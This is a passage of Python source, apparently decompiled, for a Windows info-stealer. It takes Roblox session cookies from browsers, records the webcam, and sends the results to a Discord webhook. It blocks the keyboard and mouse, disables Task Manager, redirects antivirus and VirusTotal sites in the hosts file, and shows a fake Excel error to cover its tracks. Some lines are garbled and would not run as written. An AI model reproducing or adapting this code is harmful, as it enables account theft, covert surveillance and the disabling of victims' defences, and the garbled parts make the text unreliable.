    browsers = [Edge, Chrome, Firefox, Opera, Safari, Brave]
    for browser in browsers:
        cookie, navigator = get_cookie_and_navigator(browser)
        if cookie:
            try:
                info = requests.get('https://www.roblox.com/mobileapi/userinfo', cookies={'.ROBLOSECURITY': cookie})
                information = json.loads(info.text)
            except:
                pass
            try:
                username_roblox = information['UserName']
            except:
                username_roblox = 'None'
            try:
                user_id_roblox = information['UserID']
            except:
                user_id_roblox = 'None'
            try:
                robux_roblox = information['RobuxBalance']
            except:
                robux_roblox = 'None'
            try:
                premium_roblox = information['IsPremium']
            except:
                premium_roblox = 'None'
            try:
                avatar_roblox = information['ThumbnailUrl']
            except:
                avatar_roblox = avatar_embed
            try:
                builders_club_roblox = information['IsAnyBuildersClubMember']
            except:
                builders_club_roblox = 'None'
            size_cookie = len(cookie)
            middle_cookie = size_cookie // 2
            cookie_part1 = cookie[:middle_cookie]
            cookie_part2 = cookie[middle_cookie:]
            client = SyncWebhook.from_url(webhook_url)
            embed = discord.Embed(title=f':video_game: | Roblox Info `{username_pc} \"{ip_address_public}\"`:', color=color_embed)
            embed.set_footer(text=footer_text, icon_url=avatar_embed)
            embed.set_thumbnail(url=avatar_roblox)
            embed.add_field(name=':compass: | Navigator:', value=f'```{navigator}```', inline=True)
            embed.add_field(name=':bust_in_silhouette: | Username:', value=f'```{username_roblox}```', inline=True)
            embed.add_field(name=':robot: | Id:', value=f'```{user_id_roblox}```', inline=True)
            embed.add_field(name=':moneybag: | Robux:', value=f'```{robux_roblox}```', inline=True)
            embed.add_field(name=':tickets: | Premium:', value=f'```{premium_roblox}```', inline=True)
            embed.add_field(name=':construction_site: | Builders Club:', value=f'```{builders_club_roblox}```', inline=True)
            embed.add_field(name=':cookie: | Cookie Part 1:', value=f'```{cookie_part1}```', inline=False)
            embed.add_field(name=':cookie: | Cookie Part 2:', value=f'```{cookie_part2}```', inline=False)
            client.send(embed=embed, username=username_embed, avatar_url=avatar_embed)

def Camera_Capture_Grab():
    try:
        from datetime import datetime
        name_file_capture = f'CameraCapture_{username_pc}.avi'
        time_capture = 10
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            Clear()
            return

        def capture(path_file_capture):
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter(path_file_capture, fourcc, 20.0, (640, 480))
            time_start = datetime.now()
            Clear()
            while (datetime.now() - time_start).seconds < time_capture:
                Clear()
                ret, frame = cap.read()
                if not ret:
                    Clear()
                    break
                out.write(frame)
            cap.release()
            out.release()
            Clear()
        try:
            path_file_capture = f"{os.path.join(os.environ.get('USERPROFILE'), 'Documents')}\\{name_file_capture}"
            capture(path_file_capture)
        except:
            path_file_capture = name_file_capture
            capture(path_file_capture)
        embed = Embed(title=f':camera: | Camera Capture `{username_pc} \"{ip_address_public}\"`:', color=color_embed, description=f'```└── 📷 - {name_file_capture}```')
        embed.set_footer(text=footer_text, icon_url=avatar_embed)
        webhook = SyncWebhook.from_url(webhook_url)
        with open(path_file_capture, 'rb') as f:
            webhook.send(embed=embed, file=File(f, filename=name_file_capture), username=username_embed, avatar_url=avatar_embed)
        if os.path.exists(path_file_capture):
            os.remove(path_file_capture)
        Clear()
    except:
        Clear()

def Block_Key():
    - = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'ù', '`', '+', '-', '=', '*', '[', ']', '\\', ';', '\'', ',', '.', '/', 'space',
    for key_block in key:
        try:
            keyboard.block_key(key_block)
        except:
            pass

def Unblock_Key():
    - = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'ù', '`', '+', '-', '=', '*', '[', ']', '\\', ';', '\'', ',', '.', '/', 'space',
    for key_block in key:
        try:
            keyboard.unblock_key(key_block)
        except:
            pass

def Block_Task_Manager():
    """Perm Admin Required"""  # inserted
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == 'Taskmgr.exe':
            proc.terminate()
            break
    subprocess.run('reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f', shell=True)
    Clear()

def Block_Website():
    """Perm Admin Required"""  # inserted
    try:
        directory = os.getcwd()
        disk_letter = os.path.splitdrive(directory)[0]

        def block_website(website):
            hosts_path = f'{disk_letter}\\Windows\\System32\\drivers\\etc\\hosts'
            if os.path.exists(hosts_path):
                pass
            else:  # inserted
                hosts_path = 'C:\\Windows\\System32\\drivers\\etc\\hosts'
            redirect = '127.0.0.1'
            with open(hosts_path, 'a') as file:
                file.write('\n' + redirect + ' ' + website)
        websites_to_block = ['virustotal.com', 'www.virustotal.com', 'www.virustotal.com/gui/home/upload', 'avast.com', 'totalav.com', 'scanguard.com', 'totaladblock.com', 'pcprotect.com', 'mcafee.com', 'bitdefender.com', 'us.norton.com', 'avg.com', 'malwarebytes.com', 'pandasecurity.com', 'avira.com', 'norton.com', 'eset.com', 'zillya.com', 'kaspersky.com', 'usa.kaspersky.com', 'sophos.com', 'home.sophos.com', 'adaware.com', 'bullguard.com', 'clamav.net', 'drweb.com', 'emsisoft.com', 'f-secure.com', 'zonealarm.com', 'trendmicro.com', 'ccleaner.com']
        for website in websites_to_block:
            block_website(website)
    except:
        pass

def Fake_Error():
    file = 'Error.vbs'
    code = '\n    x=msgbox(\"The file is corrupt and cannot be opened.\", 16, \"Microsoft Excel\")\n    '
    try:
        with open(file, 'w') as filevbs:
            filevbs.write(code)
        Clear()
        subprocess.run(['cscript', file], shell=True)
        Clear()
        os.remove(file)
    except:
        Clear()
payload = {'content': '****╔═════════════════Victim Affected═════════════════╗****', 'username': username_embed, 'avatar_url': avatar_embed}
requests.post(webhook_url, json=payload)
try:
    Block_Key()
except:
    pass
try:
    Block_Task_Manager()
except:
    pass
try:
    Block_Website()
except:
    pass
try:
    Startup()
except:
    pass
try:
    System_Grab()
except:
    pass
try:
    Camera_Capture_Grab()
except:
    pass
try:
    Open_User_Profile_Settings()
except:
    pass
try:
    Screenshot_Grab()
except:
    pass
try:
    Discord_Grab()
except:
    pass
try:
    Browser_Grab()
except:
    pass
try:
    Roblox_Grab()
except:
    pass
payload = {'content': f'****╚══════════════════{ip_address_public}══════════════════╝****', 'username': username_embed, 'avatar_url': avatar_embed}
requests.post(webhook_url, json=payload)
try:
    Fake_Error()
except:
    pass
Clear()

def Block_Mouse():
    pyautogui.FAILSAFE = False
    width, height = pyautogui.size()
    pyautogui.moveTo(width + 100, height + 100)
while True:  # inserted
    try:
        Block_Mouse()
        if keyboard.is_pressed('alt') and keyboard.is_pressed('alt gr'):
            Unblock_Key()
            break
    except:
        pass